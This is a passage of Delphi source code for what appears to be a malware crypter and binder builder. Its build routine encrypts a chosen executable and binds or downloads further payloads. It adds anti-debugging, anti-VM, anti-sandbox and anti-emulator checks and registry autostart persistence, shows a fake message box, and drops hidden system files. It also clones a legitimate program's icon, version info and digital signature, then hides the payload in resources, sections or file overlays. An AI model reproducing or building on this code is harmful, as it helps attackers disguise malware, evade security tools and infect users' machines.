    Frm_Binder.FB_EditlDelay.Value := Data^.Delay;
    Frm_Binder.FB_ComboExec.ItemIndex := Data^.Exec;
    Frm_Binder.FB_ComboExecChange(Sender);
    Frm_Binder.FB_C_ExecPath.ItemIndex := Data^.Path;
    Frm_Binder.FB_C_ExecPathChange(Sender);
    Frm_Binder.FB_C_ExecName.Text := String(Data^.Name);
    Frm_Binder.Left := Frm_Main.Left + 250;
    Frm_Binder.Top := Frm_Main.top + 50;
    Frm_Binder.ShowModal;
    Frm_Binder.Free;
  end;
end;

procedure TFrm_Main.Edit2Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
begin
  if (List_Downloader.Selected <> nil) then
  begin
    List := List_Downloader.Selected;
    Data := List.Data;
    Frm_Downloader := TFrm_Downloader.Create(Application);
    Frm_Downloader.FDW_Panel.Caption := 'Downloader Edit '+Inttostr(List.Index);
    Frm_Downloader.FDW_EditFile.Text := List.Caption;
    Frm_Downloader.FDW_EditlDelay.Value := Data^.Delay;
    Frm_Downloader.FDW_ComboExec.ItemIndex := Data^.Exec;
    Frm_Downloader.FDW_ComboExecChange(Sender);
    Frm_Downloader.FDW_C_ExecPath.ItemIndex := Data^.Path;
    Frm_Downloader.FDW_C_ExecPathChange(Sender);
    Frm_Downloader.FDW_C_ExecName.Text := String(Data^.Name);
    Frm_Downloader.FDW_EditParam.Text := String(Data^.Parameter);
    Frm_Downloader.Left := Frm_Main.Left + 250;
    Frm_Downloader.Top := Frm_Main.top + 50;
    Frm_Downloader.ShowModal;
    Frm_Downloader.Free;
  end;
end;

procedure TFrm_Main.Edit_ActivexClick(Sender: TObject);
begin
  Edit_Activex.Text := GenID;
end;

procedure TFrm_Main.edit_cryptrunChange(Sender: TObject);
begin
  if edit_cryptrun.ItemIndex = 1 then
  begin
    Frm_Execute := TFrm_Execute.Create(Application);
    Frm_Execute.Left := Frm_Main.Left + 300;
    Frm_Execute.Top := Frm_Main.top + 150;
    Frm_Execute.ShowModal;
    Frm_Execute.Free;
  end else
  if edit_cryptrun.ItemIndex = 2 then
  begin
    Frm_Drop := TFrm_Drop.Create(Application);
    Frm_Drop.Left :=Frm_Main.Left + 300;
    Frm_Drop.Top := Frm_Main.top + 150;
    Frm_Drop.ShowModal;
    Frm_Drop.Free;
  end;
end;


procedure TFrm_Main.Edit_filetostubChange(Sender: TObject);
begin
  if (Edit_filetostub.itemindex = 1) then
  begin
    Frm_Resource := TFrm_Resource.Create(nil);
    Frm_Resource.Left := Frm_Main.Left + 270;
    Frm_Resource.Top := Frm_Main.top + 150;
    Frm_Resource.FR_Type.itemindex := ConvertToResType(Settings.Resource.RType);
    Frm_Resource.FR_Name.text := Settings.Resource.RName;
    Frm_Resource.FR_Split.Value := Settings.Resource.RSplit;
    Frm_Resource.ShowModal;
    Frm_Resource.Free;
  end else
  if (Edit_filetostub.itemindex = 2) then
  begin
    Frm_Sections := TFrm_Sections.Create(nil);
    Frm_Sections.Left := Frm_Main.Left + 300;
    Frm_Sections.Top := Frm_Main.top + 150;
    Frm_Sections.FS_SName.Text := settings.Section.SName;
    Frm_Sections.Check_Sect1.Checked := settings.Section.Check1;
    Frm_Sections.Check_Sect2.Checked := settings.Section.Check2;
    Frm_Sections.Check_Sect3.Checked := settings.Section.Check3;
    Frm_Sections.Check_Sect4.Checked := settings.Section.Check4;
    Frm_Sections.ShowModal;
    Frm_Sections.Free;
  end;
end;

procedure TFrm_Main.FormCreate(Sender: TObject);
var
List :Tlistitem;
begin
  List := List_VInfo.Items.Add;
  List.Caption := 'Comments';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'InternalName';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'ProductName';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'CompanyName';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'LegalCopyright';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'ProductVersion';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'FileDescription';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'LegalTrademarks';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'PrivateBuild';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'FileVersion';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'OriginalFilename';
  List.SubItems.Add('');
  List := List_VInfo.Items.Add;
  List.Caption := 'SpecialBuild';
  List.SubItems.Add('');
  {$IFDEF DebugMode}
  codesite.Send('MyHardwareid',inttostr(GetHardwareid));
  {$ENDIF}
  {$I SE_PROTECT_START_ULTRA.inc}
  try
  if not LoadEngine('engine.bin',inttostr(GetHardwareid)) then
  begin
    showmessage('failed load engine');
    Application.Terminate;
  end;
  Except
    showmessage('failed load engine');
    Application.Terminate;
  end;
  {$I SE_PROTECT_END.inc}
end;

procedure TFrm_Main.FormDestroy(Sender: TObject);
begin
  ClearList1Click(nil);
  ClearList2Click(nil);
  ClearList3Click(nil);
  MyProg.Free;
end;

procedure TFrm_Main.Group_messageChecked(Sender: TObject);
begin
  if Group_message.Checked then
  begin
    messagetype.Enabled := true;
    messagecaption.Enabled := true;
    messagetext.Enabled := true;
    messageicon.Enabled := true;
    messagebutton.Enabled := true;
    messagetext.Enabled := true;
  end else
  begin
    messagetype.Enabled := false;
    messagetype.ItemIndex := 0;
    messagecaption.Enabled := false;
    messagecaption.Text := '';
    messagetext.Enabled := false;
    messagetext.Text := '';
    messageicon.Enabled := false;
    messageicon.ItemIndex := -1;
    messagebutton.Enabled := false;
    messagebutton.ItemIndex := -1;
    messagetext.Enabled := false;
  end;
end;

procedure TFrm_Main.messagebuttonChange(Sender: TObject);
begin
  if messagebutton.ItemIndex = 0 then iButton := MB_OK
  else if messagebutton.ItemIndex = 1 then iButton := MB_OKCANCEL
  else if messagebutton.ItemIndex = 2 then iButton := MB_ABORTRETRYIGNORE
  else if messagebutton.ItemIndex = 3 then iButton := MB_YESNOCANCEL
  else if messagebutton.ItemIndex = 4 then iButton := MB_YESNO
  else if messagebutton.ItemIndex = 5 then iButton := MB_RETRYCANCEL;
end;

procedure TFrm_Main.messageiconChange(Sender: TObject);
begin
  if messageicon.ItemIndex = 0 then iIcon := MB_ICONWARNING
  else if messageicon.ItemIndex = 1 then iIcon := MB_ICONERROR
  else if messageicon.ItemIndex = 2 then iIcon := MB_ICONINFORMATION
  else if messageicon.ItemIndex = 3 then iIcon := MB_ICONSTOP
end;

procedure TFrm_Main.messagetestClick(Sender: TObject);
begin
  Messagebox(0,PChar(messagetext.Text),Pchar(messagecaption.Text),IButton+iIcon);
end;

function TFrm_Main.ProcessData(Data:ansistring):ansistring;
begin
  //>NtCompress Data
  if edit_cryptcomp.ItemIndex = 1 then
  begin
    UpdateStatus('---------------> Ntdll Compress Storage ',3);
    Data := NtCompress(Data);
  end else

  //>Zlib Data
  if edit_cryptcomp.ItemIndex = 2 then
  begin
    UpdateStatus('---------------> Zlib Compress Storage ',3);
    Data := ZCompressStr(Data);
  end else
  begin
    UpdateStatus('---------------> Not Compress ',3);
  end;

  //>SimpleXor Data
  if edit_cryptenc.ItemIndex = 0 then
  begin
    UpdateStatus('---------------> [Xor] Encrypt Storage ',5);
    Data := SimpleXor(Data,KeyEnc);
  end else

  //>Rc4 Data
  if edit_cryptenc.ItemIndex = 1 then
  begin
    UpdateStatus('---------------> [RC4] Encrypt Storage ',5);
    Data := RC4(Data,KeyEnc);
  end else

  //>Blowfish Normal Data
  if edit_cryptenc.ItemIndex = 2 then
  begin
    UpdateStatus('---------------> [Normal-Blowfish] Encrypt Storage ',5);
    Data := BFEncrypt(KeyEnc,pansichar(Data),length(Data));
  end else

  //>Blowfish CBC Data
  if edit_cryptenc.ItemIndex = 3 then
  begin
    UpdateStatus('---------------> [CBC-Blowfish] Encrypt Storage ',5);
    Data := BFEncryptCBC(KeyEnc,pansichar(Data),length(Data));
  end else

  //>DES Normal Data
  if edit_cryptenc.ItemIndex = 4 then
  begin
    UpdateStatus('---------------> [Normal-DES] Encrypt Storage ',5);
    Data := DESEncrypt(Key128to64(KeyEnc),pansichar(Data),length(Data));
  end else

  //>DES CBC Data
  if edit_cryptenc.ItemIndex = 5 then
  begin
    UpdateStatus('---------------> [CBC-DES] Encrypt Storage ',5);
    Data := DESEncryptCBC(Key128to64(KeyEnc),pansichar(Data),length(Data));
  end else

  //>3DES Normal Data
  if edit_cryptenc.ItemIndex = 6 then
  begin
    UpdateStatus('---------------> [Normal-3DES] Encrypt Storage ',5);
    Data := TripleDESEncrypt(KeyEnc,pansichar(Data),length(Data));
  end else

  //>3DES CBC Data
  if edit_cryptenc.ItemIndex = 7 then
  begin
    UpdateStatus('---------------> [CBC-3DES] Encrypt Storage ',5);
    Data := TripleDESEncryptCBC(KeyEnc,pansichar(Data),length(Data));
  end else

  //>Rijndael Normal Data
  if edit_cryptenc.ItemIndex = 8 then
  begin
    UpdateStatus('---------------> [Normal-Rijndael] Encrypt Storage ',5);
    Data := RDLEncrypt(KeyEnc,length(KeyEnc),pansichar(Data),length(Data));
  end else

  //>Rijndael CBC Data
  if edit_cryptenc.ItemIndex = 9 then
  begin
    UpdateStatus('---------------> [CBC-Rijndael] Encrypt Storage ',5);
    Data := RDLEncryptCBC(KeyEnc,length(KeyEnc),pansichar(Data),length(Data));
  end;

  result := data;
end;

Procedure TFrm_Main.Build(const projectname,dirpath:string);
var
GeneratedResult : string;
BuildInfo : TBuildInfo;
code : tstringlist;
Buff,cryptdata : ansistring;
Streaming :TMemoryStream;
I : integer;
Attrib :Cardinal;
TempName, buildresult : string;
NextData : PBinder;
havebrowser,havedrop,usepath :boolean;
havebinder,havedownloader : boolean;
stubindex : integer;
begin
  {$I SE_PROTECT_START_ULTRA.inc}
  NameList := TGpStringHash.Create(3000,true);
  ListBox_BuildLog.Items.Clear;
  ProgressBuild.Value := 0;
  code := tstringlist.Create;
  Streaming := TMemoryStream.Create;
  havebrowser := false;
  havedrop := false;
  havebinder := false;
  havedownloader := false;
  GeneratedResult := '';
  stubindex := Edit_filetostub.ItemIndex;
  try
    {start here}
    UpdateStatus('Start Build',0);

    //>Save Crypt Info
    UpdateStatus('---------------> Start Processing Crypter ',1);
    WriteUniString(Streaming,edit_cryptparam.Text); //parameter
    WriteByte(Streaming,edit_cryptrun.ItemIndex); //run method
    usepath := (edit_cryptrun.ItemIndex = 1) or (edit_cryptrun.ItemIndex = 2);
    if (edit_cryptrun.ItemIndex = 1) then
    begin
      havebrowser :=  true;
      WriteByte(Streaming,Settings.Execute.index); //index
      WriteUniString(Streaming,Settings.Execute.Filename); //Filename
    end else
    if (edit_cryptrun.ItemIndex = 2) then
    begin
      havedrop := true;
      WriteByte(Streaming,Settings.Drop.index); //index
      WriteUniString(Streaming,Settings.Drop.Filename); //Filename
      WriteBoolean(Streaming,Settings.Drop.Hidden); //hidden
      WriteBoolean(Streaming,Settings.Drop.system); //system
    end;

    //>Load Crypt File
    UpdateStatus('---------------> Load Crypt File ',3);
    Buff := LoadFile2String(edit_cryptfile.Text);

    //>Store Crypt Buff
    UpdateStatus('---------------> Store Crypt Buff ',3);
    WriteAnsiString(Streaming,Buff); // buff

    //>Processing Binder
    UpdateStatus('---------------> Start Processing Binder ',1);
    if (List_Binder.Items.Count <> 0) then
    begin
      havebinder := true;
      WriteInteger(Streaming,List_Binder.Items.Count); //Binder Count
      for i := 0 to List_Binder.Items.Count - 1 do
      begin
        NextData := List_Binder.Items.Item[i].Data;
        {$IFDEF DebugMode}codesite.SendAssigned('BinderData '+inttostr(i),NextData);{$ENDIF}
        WriteUniString(Streaming,NextData^.Parameter); //parameter
        WriteInteger(Streaming,NextData^.Delay); //Delay
        if not usepath then usepath := (NextData^.Exec =2) or (NextData^.Exec =1);
        if not havebrowser then havebrowser := (NextData^.Exec =2);
        if not havedrop then havedrop := (NextData^.Exec =1);
        WriteByte(Streaming,NextData^.Exec); //Exec
        WriteByte(Streaming,NextData^.Path); //Path
        WriteUniString(Streaming,NextData^.Name); //Filename
        Buff := LoadFile2String(List_Binder.Items.Item[i].Caption);
        WriteAnsiString(Streaming,Buff); // buff
      end;
    end;
    UpdateStatus('---------------> End Processing Binder ',20);

    //>Processing Downloader
    UpdateStatus('---------------> Start Processing Downloader ',1);
    if (List_Downloader.Items.Count <> 0) then
    begin
      havedownloader := true;
      WriteInteger(Streaming,List_Downloader.Items.Count); //Binder Count
      for i := 0 to List_Downloader.Items.Count - 1 do
      begin
        NextData := List_Downloader.Items.Item[i].Data;
        WriteUniString(Streaming,NextData^.Parameter); //parameter
        WriteInteger(Streaming,NextData^.Delay); //Delay
        if not usepath then usepath := (NextData^.Exec =2) or (NextData^.Exec =1);
        if not havebrowser then havebrowser := (NextData^.Exec =2);
        if not havedrop then havedrop := (NextData^.Exec =1);
        WriteByte(Streaming,NextData^.Exec); //Exec
        WriteByte(Streaming,NextData^.Path); //Path
        WriteUniString(Streaming,NextData^.Name); //Filename
        WriteUniString(Streaming,List_Downloader.Items.Item[i].Caption); //LinkPath
      end;
    end;
    UpdateStatus('---------------> End Processing Downloader ',10);

    //>Fill BuildInfo
    UpdateStatus('---------------> Fill BuildInfo ',3);
    BuildInfo.projectname := ansistring(genkey);
    {$IFDEF DebugMode}BuildInfo.Debug := false;  {$ENDIF}
    BuildInfo.hardwareid := GetHardwareid;
    BuildInfo.CompressMethod := edit_cryptcomp.ItemIndex;
    BuildInfo.EncryptionMethod := edit_cryptenc.ItemIndex;
    BuildInfo.AntiDebug := Check_AntiDebug.Checked;
    BuildInfo.AntiMonitor := Check_AntiMonitor.Checked;
    BuildInfo.AntiSandbox := Check_AntiSandbox.Checked;
    BuildInfo.AntiVM := Check_AntiVM.Checked;
    BuildInfo.AntiEmul := Check_AntiEmulator.Checked;
    BuildInfo.PatchPeb := check_pacthPeb.Checked;
    BuildInfo.usepath := usepath;
    BuildInfo.havebrowser := havebrowser;
    BuildInfo.havedrop := havedrop;
    BuildInfo.havebinder := havebinder;
    BuildInfo.havedownloader := havedownloader;
    BuildInfo.haveStartup := Check_HKLM.Checked or Check_HKCU.Checked or Check_Policies.Checked or Check_Activex.Checked;
    BuildInfo.hklm := Check_HKLM.Checked;
    if BuildInfo.hklm then
    begin
      TempName := Edit_HKLM.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.hklmkey := ansistring(TempName);
    end;
    BuildInfo.hkcu := Check_hkcu.Checked;
    if BuildInfo.hkcu then
    begin
      TempName := Edit_hkcu.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.hkcukey := ansistring(TempName);
    end;
    BuildInfo.Policies := Check_Policies.Checked;
    if BuildInfo.Policies then
    begin
      TempName := Edit_Policies.Text;
      if (TempName = '') then TempName := genkey;
      BuildInfo.Policieskey := ansistring(TempName);
    end;
    BuildInfo.Activex := Check_Activex.Checked;
    if BuildInfo.Activex then
    begin
      TempName := Edit_Activex.Text;
      if (TempName = '') then TempName := GenID;
      BuildInfo.Activexkey := ansistring(TempName);
      BuildInfo.ComponentID := ansistring(projectname);
      BuildInfo.Vesion := '0.0.3.4';
    end;
    BuildInfo.Cryptdata := '';
    GenerateMD5Key(KeyEnc,genkey);
    UpdateStatus('---------------> Storage Encryption Key : '+BufferToHex(KeyEnc,length(KeyEnc)),3);
    BuildInfo.EncKey := ansistring(BufferToVariable(KeyEnc,length(KeyEnc),string(GetName('EncKey'))));

    BuildInfo.ActiveFakeM := frm_main.Group_message.Checked;
    if BuildInfo.ActiveFakeM then
    begin
      BuildInfo.MessageType := frm_main.messagetype.ItemIndex;
      TempName := frm_main.messagetext.Text;
      if (TempName = '') then TempName := ' ';
      BuildInfo.MessageText := ansistring(TempName);
      TempName := frm_main.messagecaption.Text;
      if (TempName = '') then TempName := ' ';
      BuildInfo.MessageCaption := ansistring(TempName);
      BuildInfo.MessageButton := Ansistring(inttostr(iIcon+iButton));
    end;

    //>ProcessData Storage
    Streaming.Position := 0;
    setlength(cryptdata,Streaming.Size);
    Streaming.Read(Pointer(cryptdata)^,Streaming.Size);
    cryptdata := ProcessData(cryptdata);
    UpdateStatus('---------------> Storage Size = '+inttostr(length(cryptdata)),3);

    if (Edit_filetostub.ItemIndex = 0) then
    begin
      stubindex := 1;
      settings.Resource.RName := 'CGPROT';
      settings.Resource.RType := 10;
      settings.Resource.RSplit := 20;
    end;

    if (length(cryptdata) < 1500000) and (Edit_filetostub.ItemIndex = 0) then
    begin
      UpdateStatus('---------------> Storage Store To Code ',10);
      BuildInfo.BufferMethod := 0;
      BuildInfo.Cryptdata := ThreadBufferToVariable(cryptdata,string(GetName('Data')));
    end else
    begin
      if (stubindex = 1) then
      begin
        BuildInfo.BufferMethod := 1;
        TempName := settings.Resource.RName;
        if (TempName = '') then TempName := 'CGPROT';
        BuildInfo.ResourceName := ansistring(TempName);
        BuildInfo.Restype := ansistring(inttostr(settings.Resource.RType));
        BuildInfo.ResSplit := ansistring(inttostr(settings.Resource.RSplit));
      end else
        BuildInfo.BufferMethod := 2;
    end;

    //>>Generate Code
    UpdateStatus('---------------> Generate Code',3);
    code.Add(string(TMaincode(Engine)(BuildInfo)));

    //{$IFDEF DebugMode}
    //code.SaveToFile('debug\tempcode.dpr');
    //{$ENDIF}

    //>>Compile Our Code
    UpdateStatus('---------------> Compile Code',3);
    if Compile(String(BuildInfo.projectname),code,buildresult) then
    begin
      {$IFDEF DebugMode}
      codesite.Send(csmnote,'succes compile',fileexists(String(BuildInfo.projectname)+'.exe'));
      {$ENDIF}
      copyfile(pchar(String(BuildInfo.projectname)+'.exe'),pchar(dirpath+projectname+'.exe'),false);
      deletefile(String(BuildInfo.projectname)+'.exe');
    end;

    stringtofile(buildresult,'buildlog.txt');

    //>>Process Storage if not writen in code
    if (BuildInfo.Cryptdata = '') then
    begin
      if not fileexists(dirpath+projectname+'.exe') then
      begin
        FM_Message.MessageDlg('Final File Not Exists, Failed Compiling...!!!',mtWarning,[mbOk],0);
        exit;
      end;
      //use resource
      if (stubindex = 1) then
      begin
        UpdateStatus('---------------> Storage Store To Resource ',10);
        TempName := settings.Resource.RName;
        if (TempName = '') then TempName := 'CGPROT';
        WriteToReSource(dirpath+projectname+'.exe',pchar(settings.Resource.RType),cryptdata,settings.Resource.RSplit,TempName);
      end else
      if (stubindex = 2) then
      begin
        //use Section
        UpdateStatus('---------------> Storage Store To Section ',10);
        TempName := settings.Section.SName;
        if (TempName = '') then TempName := 'CGPROT';
        Attrib := 0;
        if settings.Section.Check1 then Attrib := Attrib or IMAGE_SCN_CNT_CODE;
        if settings.Section.Check2 then Attrib := Attrib or IMAGE_SCN_MEM_WRITE;
        if settings.Section.Check3 then Attrib := Attrib or IMAGE_SCN_MEM_READ;
        if settings.Section.Check4 then Attrib := Attrib or IMAGE_SCN_MEM_EXECUTE;
        AddNewSection(dirpath+projectname+'.exe',AnsiString(TempName),Attrib,@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 3) then
      begin
        //use PushingEnvelope
        UpdateStatus('---------------> Storage Store To Cave Header (Pushing The Envelope) ',10);
        Pushingtheenvolpe(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 4) then
      begin
        //use EOF
        UpdateStatus('---------------> Storage Store To EOF ',10);
        WriteEof(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end else
      if (stubindex = 5) then
      begin
        //use ExSection
        UpdateStatus('---------------> Storage Store To ExSection ',10);
        ExSection(dirpath+projectname+'.exe',@cryptdata[1],length(cryptdata));
      end;
    end;

    //>Wipe Dos Header
    if check_PE1.Checked then
    begin
      UpdateStatus('---------------> Wipe Dos Header ',2);
      WipeStub(dirpath+projectname+'.exe',projectname+'.exe');
    end;

    //>Stript Relocations
    if check_PE2.Checked then
    begin
      UpdateStatus('---------------> Stript Relocations ',2);
      StripRelocationTable(dirpath+projectname+'.exe');
    end;

    //>Clone Icon
    if Check_CloneIcon.checked then
    begin
      UpdateStatus('---------------> Clone Icon ',2);
      if fileexists(selectedicon) then
      begin
        ChangeIcon(selectedicon,projectname+'.exe');
      end else
      begin
        ChangeIcon(Edit_CloneSource.Text,dirpath+projectname+'.exe');
      end;
    end;

    //>Clone Version
    if check_cloneversion.Checked then
    begin
      UpdateStatus('---------------> Clone Version ',2);
      cloneVersion(Edit_CloneSource.Text,dirpath+projectname+'.exe');
    end;

    //>Clone DigitalSignature
    if Check_CloneSign.Checked then
    begin
      UpdateStatus('---------------> Clone Digital-Signature ',2);
      CloneSign(Edit_CloneSource.Text,dirpath+projectname+'.exe');
    end;

    //>ReCheckSum File
    if check_PE3.Checked then
    begin
      UpdateStatus('---------------> ReCheckSum File ',2);
      ReChecksum(dirpath+projectname+'.exe');
    end;

    if check_CopyEof.Checked then
    begin
      UpdateStatus('---------------> Copy EOf ',3);
      AddEof(edit_cryptfile.Text,dirpath+projectname+'.exe');
    end;

    if check_Misc1.Checked then
    begin
      UpdateStatus('---------------> Generate Result Log',10);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'MainInfo'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'File : '+edit_cryptfile.text +#13#10;
      GeneratedResult := GeneratedResult + 'Param : '+edit_cryptparam.text+#13#10;
      GeneratedResult := GeneratedResult + 'Encryption : '+edit_cryptenc.text+#13#10;
      GeneratedResult := GeneratedResult + 'Compression : '+edit_cryptcomp.text+#13#10;
      GeneratedResult := GeneratedResult + 'RunMethod : '+edit_cryptrun.text+#13#10;
      GeneratedResult := GeneratedResult + 'BinderCount : '+inttostr(List_Binder.Items.Count)+#13#10;
      GeneratedResult := GeneratedResult + 'DownloaderCount : '+inttostr(List_Downloader.Items.Count)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Clone'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'File Source : '+Edit_CloneSource.text +#13#10;
      GeneratedResult := GeneratedResult + 'VersionInfo : '+Booltostr(Check_CloneVersion.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Icon : '+Booltostr(Check_CloneIcon.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Digital Signature : '+Booltostr(Check_CloneSign.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Antis'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Sandbox : '+Booltostr(Check_AntiSandbox.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Virtual Machine : '+Booltostr(Check_AntiVM.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Debugger : '+Booltostr(Check_AntiDebug.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Monitor : '+Booltostr(Check_AntiMonitor.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Emulator : '+Booltostr(Check_AntiEmulator.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Storage'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Storage Size :'+inttostr(length(cryptdata))+#13#10;
      if (length(cryptdata) < 1500000) and (stubindex = 0) then
      begin
      GeneratedResult := GeneratedResult + 'Storage Location : Code'+#13#10;
      end else
      begin
        if (stubindex = 1) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Resource -'+settings.Resource.RName+' - '+inttostr(settings.Resource.RType)+' - '+inttostr(settings.Resource.RSplit)+#13#10;
        end else
        if (stubindex = 2) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Section -'+settings.Section.SName+#13#10;
        end else
        if (stubindex = 3) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : Pushing Envelope '#13#10;
        end else
        if (stubindex = 4) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : EOF '+#13#10;
        end else
        if (stubindex = 5) then
        begin
          GeneratedResult := GeneratedResult + 'Storage Location : ExSection '+#13#10;
        end;
      end;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'PE Utils'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Wipe DosHeader : '+Booltostr(check_PE1.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'Stript Relocations : '+Booltostr(check_PE2.checked,true)+#13#10;
      GeneratedResult := GeneratedResult + 'ReCheckSum : '+Booltostr(check_PE3.checked,true)+#13#10;
      if not check_Misc2.Checked then
      begin
        stringtofile(GeneratedResult,projectname+'.txt');
      end;
    end;

    if check_Misc2.Checked then
    begin
      UpdateStatus('---------------> Scan Result',3);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'Scan Result'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      TempName := ScanFIle(projectname+'.exe',40);
      GeneratedResult := GeneratedResult +  TempName;
      stringtofile(GeneratedResult,projectname+'.txt');
    end;

    if check_logbuild.Checked then
    begin
      UpdateStatus('---------------> Generate LogBuild',3);
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + 'SourceCode'+#13#10;
      GeneratedResult := GeneratedResult + '=================================================================================================='+#13#10;
      GeneratedResult := GeneratedResult + code.Text;
      GenerateMD5Key(KeyEnc,inttostr(GetHardwareid));
      cryptdata := ansistring(GeneratedResult);
      cryptdata := RDLEncrypt(KeyEnc,length(KeyEnc),pansichar(cryptdata),length(cryptdata));
      exStringToFile(cryptdata,'logbuild.dat');
    end;

    UpdateStatus('End Build',100);
    {End here}

    if assigned(code) then code.Free;
    if assigned(NameList) then NameList.Free;
    if assigned(Streaming) then Streaming.Free;
  Except
    if assigned(code) then code.Free;
    if assigned(NameList) then NameList.Free;
    if assigned(Streaming) then Streaming.Free;
  end;
  {$I SE_PROTECT_END.inc}
end;
end.
